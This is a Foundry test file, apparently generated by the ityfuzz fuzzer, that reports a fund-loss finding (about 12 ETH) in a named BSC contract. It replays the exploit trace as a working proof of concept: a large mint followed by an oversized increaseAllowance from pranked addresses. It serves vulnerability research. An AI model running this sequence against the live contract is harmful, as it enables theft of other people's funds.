// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315678 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 12.037 ETH by interacting with the provided contracts

================ Trace ================
[38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] [38;2;179;73;114m0xc342774492b54ce5F8ac662113ED702Fc1b34972.[38;2;255;123;114mmint(79073420009.3536 ether, "", [38;2;211;29;219m0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, (), (), ())
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] [38;2;179;73;114m0xc342774492b54ce5F8ac662113ED702Fc1b34972.[38;2;255;123;114mincreaseAllowance([38;2;205;121;221m0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 110438472829237906089658866938782051210057076964075296.6912 ether)


 */

contract Cc342 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315678);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        bytes32[] memory arr0 = new bytes32[](0);
        bytes32[] memory arr1 = new bytes32[](0);
        uint8[] memory arr2 = new uint8[](0);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).mint(79073420009.3536 ether, "", 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, arr0, arr1, arr2);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).increaseAllowance(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 110438472829237906089658866938782051210057076964075296.6912 ether);
    }

}

interface I {
    function mint(uint256,string memory,address,bytes32[] memory,bytes32[] memory,uint8[] memory) external payable;
    function increaseAllowance(address,uint256) external payable;
}
